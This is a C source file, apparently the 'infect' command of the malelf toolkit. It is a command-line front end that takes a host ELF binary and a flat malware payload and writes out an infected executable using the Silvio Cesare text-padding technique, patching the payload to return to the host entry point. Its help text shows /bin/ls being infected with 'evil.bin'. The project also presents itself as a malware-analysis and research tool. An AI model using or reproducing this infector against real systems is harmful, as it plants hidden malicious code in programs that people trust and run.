/*
 * The malelf tool was written in pure C and developed using malelf library
 * to analyze (static/dynamic) malwares and infect ELF binaries. Evil using
 * this tool is the responsibility of the programmer.
 *
 * Author: Tiago Natel de Moura <tiago4orion@gmail.com>
 *
 * Contributor: Daniel Ricardo dos Santos <danielricardo.santos@gmail.com>
 *              Paulo Leonardo Benatto <benatto@gmail.com>
 *
 * Copyright 2012, 2013 by Tiago Natel de Moura. All Rights Reserved.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include <unistd.h>
#include <getopt.h>
#include <assert.h>
#include <errno.h>

#include "util.h"
#include "infect.h"

#include <malelf/defines.h>
#include <malelf/error.h>
#include <malelf/debug.h>
#include <malelf/binary.h>
#include <malelf/shellcode.h>
#include <malelf/infect.h>

char *malelf_techniques[] = {
        "silvio-text-padding",
        "nop"
};

#define N_TECHNIQUES 1

int g_argc;
char **g_argv;

void malelf_infect_help()
{
        HELP("\n");
        HELP("This command is used to assist in the process of binary ");
        HELP("infection.\n");
        HELP("Usage: %s infect <options>\n", *g_argv);
        HELP("         -h, --help    \t\tInfect Help\n");
        HELP("         -i, --input   \t\tInput host file\n");
        HELP("         -o, --output  \t\tOutput infected file\n");
        HELP("         -m, --malware \t\tFLAT binary malware.\n");
        HELP("         -f, --offset-return\tOffset in shellcode to patch the host entrypoint\n");
        HELP("         -a, --auto-shellcode\tAutomatically patch shellcode with host entrypoint\n");
        HELP("         -t, --technique  \tTechnique to infect.\n");
        HELP("         -l, --list       \tList techniques.\n");
        HELP("Example: %s infect -i /bin/ls -o myls -m evil.bin -t "
             "'%s'\n", *g_argv, malelf_techniques[0]);
        HELP("\n");
        exit(MALELF_SUCCESS);
}

_u32 _malelf_list_techniques()
{
        int i;

        HELP("List of infect techniques supported:\n\n");
        for (i = 0; i < N_TECHNIQUES; i++) {
                HELP("\t%u - %s\n", i, malelf_techniques[i]);
        }

        return MALELF_SUCCESS;
}


_u32 malelf_infect_verify_technique(MalelfInfect *obj)
{
        char *endptr;
        long val;
        unsigned i;
        assert (NULL != obj->technique);

        errno = 0;    /* To distinguish success/failure after call */
        val = strtol(obj->technique, &endptr, 10);

        /* Check for various possible errors */

        if ((errno == ERANGE && (val == LONG_MAX || val == LONG_MIN))
            || (errno != 0 && val == 0)) {
                MALELF_PERROR(errno);
                return MALELF_ERROR;
        }

        if (endptr == obj->technique) {
                MALELF_DEBUG_INFO("No digits were found in technique\n");
                /* parse string */
                for (i = 0;
                     i < N_TECHNIQUES;
                     i++) {
                        if (strncmp(malelf_techniques[i],
                                    obj->technique,
                                    strlen(malelf_techniques[i])) == 0) {
                                obj->itech = i;
                                return MALELF_SUCCESS;
                        }
                }

                return MALELF_ERROR;
        }

        /* If we got here, strtol() successfully parsed a number */

        if (*endptr != '\0') {
                fprintf(stderr,
                        "Mixed digits and string in technique. Use"
                        "(malelf infect -l) to show available techniques"
                        "...\n");
                return MALELF_ERROR;
        }

        if (val >= 0 && val < N_TECHNIQUES) {
                obj->itech = (_u8) val;
        } else {
                fprintf(stderr,
                        "Technique number out of range... Use "
                        "(malelf infect -l) to list available "
                        "techniques.\n");
                return MALELF_ERROR;
        }

        return MALELF_SUCCESS;
}

_u32 _malelf_infect_cesare(MalelfInfect *obj)
{
        _u32 result = MALELF_SUCCESS;
        MalelfBinary input;
        MalelfBinary output;
        MalelfBinary malware;
        MalelfBinary malware_ready;
        _u32 magic_bytes = 0;

        MALELF_DEBUG_INFO("Infecting by silvio cesare technique.");
        MALELF_LOG_SUCCESS("Infecting by silvio cesare technique (text-padding)\n");

        malelf_binary_init_all(4,
                               &input,
                               &output,
                               &malware,
                               &malware_ready);

        result = malelf_binary_open(&input, obj->ifname);
        if (MALELF_SUCCESS != result) {
                goto cesare_error;
        }

        if (MALELF_ELF32 == input.class) {
                malware.class = MALELF_FLAT32;
                malware_ready.class = MALELF_FLAT32;
        } else if (MALELF_ELF64 == input.class) {
                malware.class = MALELF_FLAT64;
                malware_ready.class = MALELF_FLAT64;
        } else {
                malware.class = MALELF_FLAT;
                malware_ready.class = MALELF_FLAT;
        }

        result = malelf_binary_open(&malware, obj->mfname);
        if (MALELF_SUCCESS != result) {
                goto cesare_error;
        }

        MALELF_LOG_SUCCESS("binary input: '%s', size: %u bytes\n",
                           input.fname,
                           input.size);
        MALELF_LOG_SUCCESS("binary output: '%s'\n",
                           obj->ofname);
        MALELF_LOG_SUCCESS("malware payload: '%s', size: %u bytes\n\n",
                           malware.fname,
                           malware.size);

        if (obj->auto_shellcode) {
                /* with --auto-shellcode the infector automatically
                   call malelf_shellcode_* to patch the input shellcode
                   with a JMP $MAGIC_BYTES that will be patched by
                   infector. */
                _u32 magic_offset = 0;
                result = malelf_shellcode_create_flat(&malware_ready,
                                                      &malware,
                                                      &magic_offset,
                                                      0,
                                                      0);

                if (MALELF_SUCCESS != result) {
                        MALELF_LOG_ERROR("Failed to create a payload from '%s'\n",
                                         malware.fname);
                        goto cesare_error;
                }

                MALELF_LOG_SUCCESS("Payload shellcode automatically "
                                   "created, magic bytes at '0x%04x'\n",
                                   magic_offset);
                result = malelf_infect_silvio_padding(&input,
                                                      &output,
                                                      &malware_ready,
                                                      0,
                                                      magic_bytes);
        } else if (obj->offset_ret > 0) {
                result = malelf_infect_silvio_padding(&input,
                                                      &output,
                                                      &malware,
                                                      obj->offset_ret,
                                                      0);
        } else {
                MALELF_LOG_SUCCESS("Trying to find magic bytes in shellcode "
                                   "to patch with host entry point.\n");
                /* Malelficus will search for the magic bytes in shellcode
                   and if found he will patch with the host entry point.*/
                union malelf_dword magic_bytes;
                magic_bytes.long_val = MALELF_MAGIC_BYTES;
                result = malelf_find_magic_number(malware.mem,
                                                  malware.size,
                                                  magic_bytes,
                                                  &obj->offset_ret);
                if (MALELF_SUCCESS != result) {
                        MALELF_LOG_WARN("malelficus doesn't found the "
                                          "magic bytes 0x%08x in '%s'",
                                          magic_bytes.long_val,
                                          malware.fname);
                        MALELF_LOG_WARN("You can use -b/--magic-bytes to "
                                        "specify another magic bytes in "
                                        "malware or use -f/--offset-ret "
                                        "to specify the exact offset in "
                                        "malware where malelf could "
                                        "overwrite with host entry point."
                                );

                }

                MALELF_LOG_SUCCESS("Found at '0x%04x\n", obj->offset_ret);

                result = malelf_infect_silvio_padding(&input,
                                                      &output,
                                                      &malware,
                                                      obj->offset_ret,
                                                      0);
        }

        if (MALELF_SUCCESS != result) {
                goto cesare_error;
        }

        MALELF_LOG_SUCCESS("Successfully infected.\n");

        result = malelf_binary_write(&output, obj->ofname, 1);

        if (MALELF_SUCCESS == result) {
                goto cesare_cleanup;
        } else {
                MALELF_LOG_ERROR("Failed to write output infected "
                                 "binary: %s\n",
                                 output.fname);
        }

cesare_error:
        if (MALELF_SUCCESS != result) {
                MALELF_PERROR(result);
        }

cesare_cleanup:
        malelf_binary_close(&input);
        malelf_binary_close(&output);
        malelf_binary_close(&malware);
        malelf_binary_close(&malware_ready);
        return result;
}

_u32 _malelf_infect(MalelfInfect *obj)
{
        _u32 result = MALELF_SUCCESS;

        assert (NULL != obj->ifname &&
                NULL != obj->ofname &&
                NULL != obj->mfname &&
                NULL != obj->technique &&
                -1 == obj->ifd &&
                -1 == obj->ofd &&
                -1 == obj->mfd);

        result = malelf_infect_verify_technique(obj);

        if (MALELF_SUCCESS != result) {
                MALELF_LOG_ERROR("Invalid -t/--technique option.\n");
                MALELF_LOG_ERROR("Use %s infect -l (to list techniques"
                                 " available.\n",
                                 *g_argv);
                return result;
        }

        assert (obj->itech != -1);

        switch (obj->itech) {
        case INFECT_TECH_CESARE:
                result = _malelf_infect_cesare(obj);
                break;
        case INFECT_TECH_NOP:
//                result = _malelf_infect_nop(obj);
                break;
        default:
                result = MALELF_ERROR;
        }

        return result;
}

static _u32 _malelf_infect_handle_options(MalelfInfect *obj,
                                          int option)
{
        static _u8 error = MALELF_SUCCESS;

        switch (option) {
        case INFECT_HELP:
                malelf_infect_help();
                break;
        case INFECT_INPUT:
                obj->ifname = optarg;
                MALELF_DEBUG_INFO("input filename = '%s'", obj->ifname);
                break;
        case INFECT_OUTPUT:
                obj->ofname = optarg;
                MALELF_DEBUG_INFO("output filename = '%s'", obj->ofname);
                break;
        case INFECT_MALWARE:
                obj->mfname = optarg;
                MALELF_DEBUG_INFO("malware filename = '%s'",
                                  obj->mfname);
                break;
        case INFECT_TECHNIQUE:
                obj->technique = optarg;
                MALELF_DEBUG_INFO("technique = '%s'", obj->technique);
                break;
        case INFECT_LIST:
                _malelf_list_techniques();
                exit(0);
        case INFECT_OFFSETRET:
                obj->offset_ret = (_u32) atoi(optarg);
                if (obj->offset_ret == 0) {
                        fprintf(stderr, "Invalid value to -f or --offset-return. Required > 0\n");
                        return MALELF_ERROR;
                }
                break;
        case INFECT_AUTOSHELLCODE:
                obj->auto_shellcode = 1;
                break;
        case ':':
                printf("Unknown option character '%s'.\n", optarg);
                break;
        case INFECT_UNKNOWN:
                malelf_infect_help();
                error = MALELF_ERROR;
                break;
        }

        return error;
}

static _u32 _malelf_infect_options(MalelfInfect *obj)
{
        _i32 option = 0;
        _u32 error = MALELF_ERROR;
        int option_index = 0;
        static struct option long_options[] = {
                {"help", 0, 0, INFECT_HELP},
                {"input", 1, 0, INFECT_INPUT},
                {"output", 1, 0, INFECT_OUTPUT},
                {"malware", 1, 0, INFECT_MALWARE},
                {"technique", 1, 0, INFECT_TECHNIQUE},
                {"offset-ret", 1, 0, INFECT_OFFSETRET},
                {"auto-shellcode", 0, 0, INFECT_AUTOSHELLCODE},
                {"list", 0, 0, INFECT_LIST},
                {0, 0, 0, 0}
        };

        if (2 == g_argc) {
                malelf_infect_help();
                return MALELF_ERROR;
        }

        while ((option = getopt_long (g_argc, g_argv, "hi:o:m:t:f:la",
                                      long_options, &option_index)) != -1) {
                error = _malelf_infect_handle_options(obj, option);
        }

        if (obj->technique == NULL) {
                obj->technique = malelf_techniques[0];
        }

        if (MALELF_SUCCESS == error ) {
                if (obj->ifname != NULL &&
                    obj->ofname != NULL &&
                    obj->technique != NULL &&
                    obj->mfname != NULL) {
                        if (obj->offset_ret > 0 &&
                            obj->auto_shellcode > 0) {
                                HELP("Use -f/--offset-ret OR "
                                     "-a/--auto-shellcode, never "
                                     "both\n");
                                return MALELF_ERROR;
                        } else {
                                /* Yes, we can infect now! */
                                error = _malelf_infect(obj);
                        }
                } else {
                        HELP("-i, -o and -m are required!\n");
                        return MALELF_ERROR;
                }
        }

        return error;
}

_u32 malelf_infect_init(MalelfInfect *obj,
                        int argc,
                        char **argv)
{
        obj->ifname = NULL;
        obj->ofname = NULL;
        obj->mfname = NULL;
        obj->ifd = -1;
        obj->ofd = -1;
        obj->mfd = -1;
        obj->technique = NULL;
        obj->itech = -1;
        obj->offset_ret = 0;
        obj->auto_shellcode = 0;

        g_argc = argc;
        g_argv = argv;

        return _malelf_infect_options(obj);
}

_u32 malelf_infect_finish(MalelfInfect *infect)
{
        UNUSED(infect);
        return MALELF_SUCCESS;
}
